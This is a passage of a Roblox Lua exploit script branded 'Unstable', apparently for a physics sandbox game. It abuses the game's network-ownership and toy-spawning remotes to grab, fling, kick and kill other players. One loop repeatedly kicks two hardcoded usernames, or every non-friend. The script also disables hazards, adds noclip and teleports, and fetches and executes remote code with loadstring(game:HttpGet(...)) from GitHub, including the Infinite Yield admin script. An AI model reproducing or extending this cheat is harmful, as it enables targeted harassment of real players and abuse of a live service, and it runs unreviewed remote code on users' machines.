    obj1.CFrame = CFrame.new(obj2.Position + obj2.Velocity * (game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() / 1000) * 5)
end
function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end
function getname(v)
    return v:split(' ')[2]:split('(')[2]:split(')')[1]
end
function HasProperty(obj, property)
    local ok = pcall(function()
        if obj[property] then
        end
    end)

    return ok
end
function FWC(Parent, Name, Time)
    return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time)
end
function grab(prt)
    RemoteSetNetworkOwner:FireServer(prt, prt.CFrame)
end
function SpawnPencilForPlayer(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)

    if not targetPlayer or not targetPlayer.Character then
        return nil
    end
    if not LocalPlayer.CanSpawnToy.Value then
        return nil
    end

    local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

    if spawnedToys then
        local oldPencil = spawnedToys:FindFirstChild(playerName)

        if oldPencil then
            DestroyToyEvent:FireServer(oldPencil)
            task.wait(0.18)
        end
    end

    local spawnCFrame = CFrame.new(targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 5))
    local success, result = pcall(function()
        return SpawnToyRF:InvokeServer('ToolPencil', spawnCFrame, Vector3.new(0, 0, 0))
    end)

    if not success then
        return nil
    end

    for i = 1, 10 do
        local spawnedToys = Workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

        if spawnedToys then
            local pencil = spawnedToys:FindFirstChild('ToolPencil')

            if pencil then
                pencil.Name = playerName

                return pencil
            end
        end

        task.wait(0.1)
    end

    return nil
end

players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
ReplicatedFirst = game:GetService('ReplicatedFirst')
RunService = game:GetService('RunService')
TeleportService = game:GetService('TeleportService')
UserInputService = game:GetService('UserInputService')
Lighting = game:GetService('Lighting')
Debris = game:GetService('Debris')
TweenService = game:GetService('TweenService')
HttpService = game:GetService('HttpService')
GuiService = game:GetService('GuiService')
ContextActionService = game:GetService('ContextActionService')
TextChatService = game:GetService('TextChatService')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
RunService = game:GetService('RunService')
Workspace = workspace
LocalPlayer = Players.LocalPlayer
dick2 = Instance.new('Folder')
dick2.Parent = workspace
dick2.Name = '<b>UNSTABLE</b>'
dick3 = Instance.new('Folder')
dick3.Parent = workspace
dick3.Name = '<b>UNSTABLE</b>'
bjlist = {}
joinland = {}
currantplrlist = {}
kickland = {}
dplist = {}
uslist = {}
usidlist = {}
poslist = {}
gettingkicked = {}
EspList = {}
OTPList = {}
AKList = {}
OKList = {}
PenisList = {}
frozenlist = {}
OKA = false
OWF = true
OKLA = false
OKLWF = true
BKA = false
BKAWL = true
AXE = false
AGE = false
AFE = false
VOBBC = false
APKE = false
AKE = false
DSL = true
prisonactive = false
FA = false
homeless = false
tpland = {
    Spawn = Vector3.new(0, -7.35, 0),
    SpawnCave = Vector3.new(-90, 14.6, -314.3),
    GreenHouse = Vector3.new(-538, -7, 74),
    PinkHouse = Vector3.new(-478, -7, -147),
    Barn = Vector3.new(-228, 82, -318),
    BlueHouse = Vector3.new(496, 83, -350),
    ChineseHouse = Vector3.new(542, 123, -93),
    PurpleHouse = Vector3.new(270, -7, 448),
    Factory = Vector3.new(134, 347, 352),
    OtherGreenHouse = Vector3.new(-359, 98, 357),
    BigCave = Vector3.new(-245, 80, 485),
    GoodPrison = Vector3.new(569.6, -7, 176.3),
    RuhubsDogAhhPrison = Vector3.new(564, 82.5, 210),
    ExtremelyGoodPrison = Vector3.new(525, 76, 56),
    TrainCave = Vector3.new(536.6, 87.5, -169.5),
    IslanCave = Vector3.new(75.8, 323, 368.5),
    ChineseRoof = Vector3.new(592, 153, -100),
    UfoCave = Vector3.new(29.6, 10.5, -225.8),
    Prison = Vector3.new(195, -7, -561),
    BlueHouseSlot = Vector3.new(562.2, 85.38, -212.56),
    SpawnSlot = Vector3.new(51.75, -5.3, -121.64),
    HauntedSlot = Vector3.new(164.57, -5.43, 530.97),
    RandomSlot = Vector3.new(-211.65, 85.7, 426.72),
    BeachSlot = Vector3.new(-546.97, -5.3, -41.09),
}
locations = {
    'Spawn',
    'Prison',
    'ChineseRoof',
    'SpawnCave',
    'GreenHouse',
    'PinkHouse',
    'Barn',
    'BlueHouse',
    'ChineseHouse',
    'PurpleHouse',
    'Factory',
    'OtherGreenHouse',
    'BigCave',
    'GoodPrison',
    'RuhubsDogAhhPrison',
    'ExtremelyGoodPrison',
    'TrainCave',
    'IslanCave',
    'UfoCave',
    'BlueHouseSlot',
    'SpawnSlot',
    'HauntedSlot',
    'RandomSlot',
    'BeachSlot',
}
locc = tpland.Prison
loccc = 'Prison'
SL = tpland.Spawn
antifirepart = nil

if game.workspace.Plots.Plot5.Barrier:FindFirstChild('AntiFirePart') then
    antifirepart = game.workspace.Plots.Plot5.Barrier.AntiFirePart
else
    antifirepart = game.workspace.Plots.Plot5.Barrier:FindFirstChild('PlotBarrier')
end

antifirepart.CanCollide = true
antifirepart.CanQuery = true
antifirepart.Name = 'AntiFirePart'
h = antifirepart:Clone()
h.Name = 'FalseBorder'
h.Parent = antifirepart.Parent
antifirepart.Size = Vector3.new(1, 1, 1)

for _, prt in pairs(antifirepart:GetChildren())do
    prt:Destroy()
end

antifirepart.CanQuery = false
antifirepart.CanCollide = false
plr = LocalPlayer
character = plr.Character or plr.CharacterAdded:Wait()
humanoid = character:WaitForChild('Humanoid')
humanoidRootPart = character:WaitForChild('HumanoidRootPart')
char = character
hum = humanoid
HRP = humanoidRootPart
Mouse = plr:GetMouse()
Camera = workspace.CurrentCamera

plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)

    character = c
    char = c
    humanoid = c:WaitForChild('Humanoid')
    humanoidRootPart = c:WaitForChild('HumanoidRootPart')
    hum = humanoid
    HRP = humanoidRootPart
end)

rs = ReplicatedStorage
DestroyToy = rs.MenuToys.DestroyToy
SetNetOwner = rs.GrabEvents.SetNetworkOwner
SpawnToy = rs.MenuToys.SpawnToyRemoteFunction
Struggle = rs.CharacterEvents.Struggle
Ragdoll = rs.CharacterEvents.RagdollRemote
StickyEvent = rs.PlayerEvents.StickyPartEvent
inv = workspace[plr.Name .. 'SpawnedInToys']
cons = {}
autoRejoinEnabled = false
tpwalking = false
tspeed = 0.1
infJumpConnection = nil
infJumpDebounce = false
WS = 1
spinspeed = 10
offset = CFrame.new(0, 15, 0)
WhitelistEnabled = false
PalletForRagdoll = nil
antiinputlag = false
autogucci = false
antikick = false
looptp = false
spingrab = false
applymethod = false
applygrabmethod = false

function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end
function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end

    local t
    local toyadded

    toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c

            toyadded:Disconnect()
        end
    end)

    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
    end)

    local time = tick() + 1

    repeat
        task.wait()
    until t or tick() > time

    if t then
        return t
    else
        local plot = getplot()

        if plot then
            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end
function getplot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild('Plot' .. i)
        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end
function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end
function gblob()
    local c = plr.Character
    local h2 = c:WaitForChild('Humanoid', 0.1)

    if h2 and h2.SeatPart then
        if h2.SeatPart.Parent.Name == 'CreatureBlobman' then
            return h2.SeatPart.Parent
        end
    end
end
function getname(v)
    if v == 'None' then
        return nil
    end

    local parts = v:split('(')

    if #parts >= 2 then
        local name = parts[2]:split(')')[1]

        return name
    end

    return nil
end
function grab(obj)
    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
end
function drop(obj, cf)
    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, Vector3.new(0, 0, 0))
end
function HasProperty(obj, property)
    local ok = pcall(function()
        if obj[property] then
        end
    end)

    return ok
end
function GetPlayerCharacter()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
        return LocalPlayer.Character
    end
end
function GetPlayerCFrame()
    local pc = GetPlayerCharacter()

    if pc then
        return pc.HumanoidRootPart.CFrame
    end
end
function GetPlayerRoot()
    local pc = GetPlayerCharacter()

    if pc then
        return pc.HumanoidRootPart
    end
end
function lookAt(startPosition, targetPosition)
    local dir = (targetPosition - startPosition).Unit
    local right = dir:Cross(Vector3.new(0, 1, 0))
    local up = right:Cross(dir)

    return CFrame.fromMatrix(startPosition, right, up)
end
function isnetworkowner(part)
    return part:FindFirstChild('PartOwner') and part.PartOwner.Value == LocalPlayer.Name
end
function lerpVector3(a, b, alpha)
    return a + (b - a) * alpha
end

bigHolePoisonPart = workspace.Map.Hole.PoisonBigHole.PoisonHurtPart
smallHolePoisonPart = workspace.Map.Hole.PoisonSmallHole.PoisonHurtPart
factoryIslandPoisonPart = workspace.Map.FactoryIsland.PoisonContainer.PoisonHurtPart
bigHolePoisonPart.Size = Vector3.new(2, 2, 2)
smallHolePoisonPart.Size = Vector3.new(2, 2, 2)
factoryIslandPoisonPart.Size = Vector3.new(2, 2, 2)
bigHolePoisonPart.Position = Vector3.new(0, -50, 0)
smallHolePoisonPart.Position = Vector3.new(0, -50, 0)
factoryIslandPoisonPart.Position = Vector3.new(0, -50, 0)
_G.FireAllPlayers = false
_G.AnnoyAllPlayers = false
_G.KillAll = false
_G.KickAll = false
_G.BringAll = false
_G.WhitelistFriends3 = false
_G.KickAllType = 'Go to the heaven!'
_G.TP_Priority = 0
_G.NoclipToggle = false
_G.CompileGroupSelected = ''
freezecampart = Instance.new('Part', workspace)
freezecampart.Anchored = true
freezecampart.CanCollide = false
freezecampart.Transparency = 1
freezecampart.CanQuery = false
freezecampart.Size = Vector3.new()

function FreezeCam(cf)
    freezecampart.CFrame = cf
    workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
    workspace.CurrentCamera.CameraSubject = freezecampart
end
function unFreezeCam()
    workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
end

local floatSteppedConnection = nil
local isFloating = nil

function startFloating()
    if not floatSteppedConnection then
        isFloating = false

        function checkCollision()
            if isFloating == false and LocalPlayer.Character ~= nil then
                for _, hitPart in pairs(LocalPlayer.Character:GetChildren())do
                    if hitPart:IsA('BasePart') and hitPart.CanCollide then
                        hitPart.CanCollide = false
                    end
                end
            end

            wait(0.21)
        end

        floatSteppedConnection = RunService.Stepped:Connect(checkCollision)
    end
end
function toggleNoclip()
    if not _G.NoclipToggle then
        if floatSteppedConnection then
            floatSteppedConnection:Disconnect()

            floatSteppedConnection = nil
        end

        isFloating = true
    end
end
function CreateSkyVelocity(skyObject)
    if not skyObject:FindFirstChild('SkyVelocity') then
        local sv = Instance.new('BodyVelocity', skyObject)

        sv.Name = 'SkyVelocity'
        sv.Velocity = Vector3.new(0, 100000000000000, 0)
        sv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    end
end
function CreateBringBody(targetPart, destinationPart)
    if targetPart:FindFirstChild('BringBody') then
        targetPart:FindFirstChild('BringBody').Position = destinationPart.Position
    else
        local bp = Instance.new('BodyPosition', targetPart)

        bp.Name = 'BringBody'
        bp.Position = destinationPart.Position
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.D = 5000
        bp.P = 1500000
    end
end
function IsPlayerInsideSafeZone(player)
    if typeof(player) == 'Instance' and player:IsA('Player') and player:FindFirstChild('InPlot') and player.InPlot.Value then
        return true
    end
end
function IsPlayerFloating(playerInstance)
    if typeof(playerInstance) == 'Instance' and playerInstance:IsA('Player') and playerInstance.Character and playerInstance.Character:FindFirstChildOfClass('Humanoid') and playerInstance.Character:FindFirstChildOfClass('Humanoid').FloorMaterial == Enum.Material.Air then
        return true
    end
end
function CheckPlayerVelocity(playerInstanceVelocity)
    if typeof(playerInstanceVelocity) == 'Instance' and playerInstanceVelocity:IsA('Player') and playerInstanceVelocity.Character and playerInstanceVelocity.Character:FindFirstChild('HumanoidRootPart') then
        return playerInstanceVelocity.Character.HumanoidRootPart.Velocity.Magnitude
    end
end
function CheckPlayer(potentialPlayer)
    if typeof(potentialPlayer) == 'Instance' and potentialPlayer ~= LocalPlayer and potentialPlayer.Character and potentialPlayer.Character:IsDescendantOf(workspace) and potentialPlayer.Character:FindFirstChild('HumanoidRootPart') and potentialPlayer.Character:FindFirstChildOfClass('Humanoid') and potentialPlayer.Character.Humanoid.Health > 0 then
        return true
    end
end
function CheckPlayerKill(p)
    if CheckPlayer(p) and not IsPlayerInsideSafeZone(p) then
        if _G.WhitelistFriends3 then
            return not LocalPlayer:IsFriendsWith(p.UserId)
        else
            return true
        end
    end
end
function CheckPlayerKick(p)
    if CheckPlayer(p) and not (IsPlayerInsideSafeZone(p) or IsPlayerFloating(p)) then
        if _G.WhitelistFriends3 then
            return not LocalPlayer:IsFriendsWith(p.UserId)
        else
            return true
        end
    end
end
function CheckPlayerBring(p)
    if CheckPlayer(p) and not IsPlayerInsideSafeZone(p) and CheckPlayerVelocity(p) < 20 then
        if _G.WhitelistFriends3 then
            return not LocalPlayer:IsFriendsWith(p.UserId)
        else
            return true
        end
    end
end
function TeleportPlayer(cframeOffset, teleportPriority)
    if (teleportPriority == nil and 0 or teleportPriority) == _G.TP_Priority then
        local pc = GetPlayerCharacter()

        if pc and not _G.TeleportingToNetworkOwnership and typeof(cframeOffset) == 'CFrame' then
            local hrp = pc.HumanoidRootPart
            local h2 = pc:FindFirstChildOfClass('Humanoid')

            hrp.CFrame = hrp.CFrame.Rotation + cframeOffset.Position

            if h2.SeatPart == nil or tostring(h2.SeatPart.Parent) ~= 'CreatureBlobman' then
                h2.Sit = false
            end
        end
    end
end
function SNOWship(targetPart)
    if targetPart and typeof(targetPart) == 'Instance' then
        local dist = LocalPlayer:DistanceFromCharacter(targetPart.Position)

        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and dist <= 30 then
            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(targetPart, lookAt(LocalPlayer.Character.HumanoidRootPart.Position, targetPart.Position))
        end
    end
end
function SNOWshipOnce(targetPart)
    local dist = LocalPlayer:DistanceFromCharacter(targetPart.Position)

    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
        if isnetworkowner(targetPart) then
            return true
        end
        if dist <= 30 then
            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(targetPart, lookAt(LocalPlayer.Character.HumanoidRootPart.Position, targetPart.Position))
        end
    end
end
function CheckNetworkOwnerShipOnPlayer(potentialPlayer, condition)
    if typeof(potentialPlayer) == 'Instance' and potentialPlayer:IsA('Player') and potentialPlayer.Character and potentialPlayer.Character:FindFirstChild('Head') and potentialPlayer.Character.Head:FindFirstChild('PartOwner') and potentialPlayer.Character.Head.PartOwner.Value == LocalPlayer.Name then
        return not condition and true or potentialPlayer.Character.Head.PartOwner
    end
end

BlobkickList = {
    'BarnoDDino',
    'ay3vx',
}
blob = nil

task.spawn(function()
    while true do
        local smegma = true
        local listtt = {}
        local gotsomeone = false

        if BKA then
            for _, p in pairs(Players:GetPlayers())do
                if p ~= LocalPlayer then
                    if BKAWL and not LocalPlayer:IsFriendsWith(p.UserId) then
                        table.insert(listtt, p.Name)
                    elseif not BKAWL then
                        table.insert(listtt, p.Name)
                    end
                end
            end
        else
            listtt = BlobkickList
        end

        for _, plrr in pairs(listtt)do
            local j, hh

            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                j = LocalPlayer.Character.HumanoidRootPart.CFrame
                hh = LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
            end
            if smegma and Players:FindFirstChild(plrr) and Players:FindFirstChild(plrr) ~= LocalPlayer then
                local plr2 = Players:FindFirstChild(plrr)
                local cont = false

                if plr2.Character and plr2.Character:FindFirstChild('HumanoidRootPart') then
                    if plr2.Character.HumanoidRootPart.Massless then
                        if plr2.Character.Humanoid.SeatPart then
                            cont = true
                        end
                    else
                        cont = true
                    end
                end
                if BKA and BKAWL and LocalPlayer:IsFriendsWith(plr2.UserId) then
                    cont = false
                end

                while smegma and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and plr2 and plr2.Character and plr2.Character.Parent == workspace and plr2.Character:FindFirstChild('HumanoidRootPart') and cont do
                    if BKA == false then
                        smegma = false
                    end

                    gotsomeone = true
                    cont = false

                    if plr2.Character and plr2.Character:FindFirstChild('HumanoidRootPart') then
                        if plr2.Character.HumanoidRootPart.AssemblyLinearVelocity.Magnitude > 5000 then
                            cont = false
                        elseif plr2.Character.HumanoidRootPart.Massless then
                            if plr2.Character.Humanoid.SeatPart then
                                cont = true
                            end
                        else
                            cont = true
                        end
                    end
                    if cont and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Parent.Name == 'CreatureBlobman' then
                        local blobRef = LocalPlayer.Character.Humanoid.SeatPart.Parent

                        if (plr2.Character.HumanoidRootPart.CFrame.Position - LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude > 30 and plr2.Character.Parent == workspace then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = plr2.Character.HumanoidRootPart.CFrame + (plr2.Character.HumanoidRootPart.AssemblyLinearVelocity / math.pi)
                            LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = plr2.Character.HumanoidRootPart.AssemblyLinearVelocity

                            task.wait(0.15)

                            if plr2.Character and plr2.Character:FindFirstChild('HumanoidRootPart') then
                                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(plr2.Character.HumanoidRootPart, plr2.Character.HumanoidRootPart.CFrame)
                            end
                        end

                        local timee = tick()

                        while tick() - timee < 0.25 and plr2 and plr2.Character and plr2.Character:FindFirstChild('HumanoidRootPart') and cont do
                            ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(plr2.Character.HumanoidRootPart, plr2.Character.HumanoidRootPart.CFrame)
                            task.wait(0.05)
                        end

                        if plr2.Character and plr2.Character:FindFirstChild('HumanoidRootPart') and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and blobRef:FindFirstChild('RightDetector') and blobRef.RightDetector:FindFirstChild('RightWeld') and blobRef:FindFirstChild('BlobmanSeatAndOwnerScript') and blobRef.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab') then
                            plr2.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1E10, 0)

                            ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(plr2.Character.HumanoidRootPart)
                            blobRef.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blobRef.RightDetector, plr2.Character.HumanoidRootPart, blobRef.RightDetector.RightWeld)
                        end
                    elseif cont then
                        if LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart then
                            LocalPlayer.Character.Humanoid.Sit = false
                        end
                        if blob and blob:FindFirstChild('VehicleSeat') then
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                            end

                            task.wait(0.1)
                        else
                            blob = nil

                            for _, itm in pairs(workspace[LocalPlayer.Name .. 'SpawnedInToys']:GetChildren())do
                                if itm.Name == 'CreatureBlobman' and itm:FindFirstChild('VehicleSeat') then
                                    blob = itm
                                elseif itm.Name == 'CreatureBlobman' then
                                    while itm and itm.Parent do
                                        ReplicatedStorage.MenuToys.DestroyToy:FireServer(itm)
                                        task.wait(0.1)
                                    end
                                end
                            end

                            if blob and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                            end
                            if not blob then
                                task.wait(1)

                                while smegma and not blob do
                                    if not BKA then
                                        smegma = false
                                    end
                                    if workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman') then
                                        blob = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys').CreatureBlobman
                                    end
                                    if not blob then
                                        task.spawn(function()
                                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15), Vector3.new(0, 0, 0))
                                            end
                                        end)
                                    end

                                    task.wait()
                                end
                            end
                        end
                    end

                    task.wait(0.1)
                end
            end
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and j then
                LocalPlayer.Character.HumanoidRootPart.CFrame = j
                LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = hh
            end
        end

        if not gotsomeone and blob then
            while blob and blob.Parent do
                ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob)
                task.wait(0.1)
            end

            blob = nil
        end

        task.wait()
    end
end)

Players = game:GetService('Players')
TweenService = game:GetService('TweenService')
plr = Players.LocalPlayer
gui = plr:WaitForChild('PlayerGui'):WaitForChild('MenuGui')
TopRight = gui:WaitForChild('TopRight')
CoinsFrame = TopRight:WaitForChild('CoinsFrame')
CoinsDisplay = CoinsFrame:WaitForChild('CoinsDisplay')
CoinImage = CoinsDisplay:WaitForChild('CoinImage')
Coins = CoinsDisplay:WaitForChild('Coins')
CoinsButton = CoinsFrame:WaitForChild('CoinsButton')

for _, v in ipairs(CoinsFrame:GetChildren())do
    if v:IsA('UICorner') or v:IsA('UIStroke') or v:IsA('UIPadding') or v:IsA('UIGradient') then
        v:Destroy()
    end
end
for _, v in ipairs(CoinsDisplay:GetChildren())do
    if v:IsA('UIListLayout') then
        v:Destroy()
    end
end

blur = Instance.new('ImageLabel')
blur.Name = 'GlassBlur'
blur.BackgroundTransparency = 1
blur.Size = UDim2.new(1, 0, 1, 0)
blur.Position = UDim2.new(0, 0, 0, 0)
blur.Image = 'rbxassetid://8992230677'
blur.ImageTransparency = 0.88
blur.ScaleType = Enum.ScaleType.Stretch
blur.ZIndex = CoinsFrame.ZIndex - 1
blur.Parent = CoinsFrame
CoinsFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
CoinsFrame.BackgroundTransparency = 0.35
CoinsFrame.AutomaticSize = Enum.AutomaticSize.X
CoinsFrame.Size = UDim2.new(0, 0, 0, 74)
corner = Instance.new('UICorner')
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = CoinsFrame
padding = Instance.new('UIPadding')
padding.PaddingLeft = UDim.new(0, 10)
padding.PaddingRight = UDim.new(0, 10)
padding.Parent = CoinsFrame
stroke = Instance.new('UIStroke')
stroke.Thickness = 1
stroke.Transparency = 0.6
stroke.Color = Color3.fromRGB(140, 170, 255)
stroke.Parent = CoinsFrame
borderGrad = Instance.new('UIGradient')
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 190, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(190, 140, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 255, 210)),
})
borderGrad.Parent = stroke

task.spawn(function()
    while CoinsFrame.Parent do
        for i = 0, 360, 1 do
            borderGrad.Rotation = i

            task.wait(0.02)
        end
    end
end)
TweenService:Create(CoinsFrame, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.25}):Play()

CoinsDisplay.BackgroundTransparency = 1
CoinsDisplay.AutomaticSize = Enum.AutomaticSize.X
CoinsDisplay.Size = UDim2.new(0, 0, 1, 0)

local layout = Instance.new('UIListLayout')

layout.FillDirection = Enum.FillDirection.Horizontal
layout.VerticalAlignment = Enum.VerticalAlignment.Center
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = CoinsDisplay
Coins.LayoutOrder = 1
Coins.BackgroundTransparency = 1
Coins.AutomaticSize = Enum.AutomaticSize.X
Coins.TextXAlignment = Enum.TextXAlignment.Left
Coins.TextYAlignment = Enum.TextYAlignment.Center
Coins.Font = Enum.Font.GothamBold
Coins.TextSize = 34
Coins.Text = tostring(Coins.Text)

local textGrad = Instance.new('UIGradient')

textGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(190, 210, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 240, 200)),
})
textGrad.Parent = Coins

task.spawn(function()
    while Coins.Parent do
        for i = 0, 360, 2 do
            textGrad.Rotation = i

            task.wait(0.03)
        end
    end
end)

CoinImage.LayoutOrder = 2
CoinImage.BackgroundTransparency = 1
CoinImage.Size = UDim2.new(0, 64, 0, 64)
CoinImage.ImageColor3 = Color3.fromRGB(255, 220, 120)
CoinImage.AnchorPoint = Vector2.new(0, 0.5)
CoinImage.Position = UDim2.new(0, 0, 0.5, 0)

task.defer(function()
    CoinImage.Image = 'rbxassetid://118486090436366'
end)
TweenService:Create(CoinImage, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    Position = CoinImage.Position + UDim2.new(0, 0, 0, -4),
}):Play()

CoinsButton.BackgroundTransparency = 1
CoinsButton.Text = ''
CoinsButton.Size = UDim2.new(1, 0, 1, 0)
CoinsButton.ZIndex = CoinsFrame.ZIndex + 5

function tween(obj, ti, props)
    TweenService:Create(obj, ti, props):Play()
end

CoinsButton.MouseEnter:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.15})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(255, 240, 160),
    })
end)
CoinsButton.MouseLeave:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.6})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(255, 220, 120),
    })
end)
CoinsButton.MouseButton1Down:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.08), {
        Size = UDim2.new(0, 0, 0, 71),
    })
end)
CoinsButton.MouseButton1Up:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 0, 0, 74),
    })
end)

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

local repo = 'https://raw.githubusercontent.com/deividcomsono/Obsidian/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local Toggles = Library.Toggles
local Options = Library.Options

RunService = game:GetService('RunService')
UserInputService = game:GetService('UserInputService')
HttpService = game:GetService('HttpService')
Players = game:GetService('Players')
MarketplaceService = game:GetService('MarketplaceService')
TeleportService = game:GetService('TeleportService')
Stats = game:GetService('Stats')
TextChatService = game:GetService('TextChatService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
Lighting = game:GetService('Lighting')
LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
humanoid = character:WaitForChild('Humanoid')
humanoidRootPart = character:WaitForChild('HumanoidRootPart')

LocalPlayer.CharacterAdded:Connect(function(c)
    character = c
    humanoid = c:WaitForChild('Humanoid')
    humanoidRootPart = c:WaitForChild('HumanoidRootPart')
end)

local OLD_NOTIFY = Library.Notify

function Library:Notify(data)
    if type(data) ~= 'table' then
        data = {
            Description = tostring(data),
        }
    end

    data.Title = data.Title or '<b>Unstable</b>'
    data.BigIcon = data.BigIcon or 'rbxassetid://118486090436366'

    return OLD_NOTIFY(self, data)
end

local Window = Library:CreateWindow({
    Title = '<b>Unstable</b>',
    Icon = '118486090436366',
    Footer = 'V 2.0',
    DisableSearch = false,
    EnableCompacting = true,
    SidebarCompacted = true,
    EnableSidebarResize = true,
    CornerRadius = 30,
    BackgroundImage = 'rbxassetid://',
})

task.spawn(function()
    local letters = {
        'U',
        'N',
        'S',
        'T',
        'A',
        'B',
        'L',
        'E',
    }
    local currentLetter = 1
    local goingReverse = false

    while task.wait(0.5) do
        local currentStr = ''

        for i = 1, currentLetter do
            currentStr = currentStr .. letters[i]
        end

        if goingReverse then
            currentLetter -= 1
        else
            currentLetter += 1
        end

        Window:SetFooter(currentStr .. '| V 2.0')

        if currentLetter > #letters then
            goingReverse = true
            currentLetter = #letters

            task.wait(2)
        elseif currentLetter <= 0 then
            goingReverse = false
            currentLetter = 1
        end
    end
end)

local C = {
    Text = 'rgb(232, 230, 242)',
    Sub = 'rgb(155, 153, 172)',
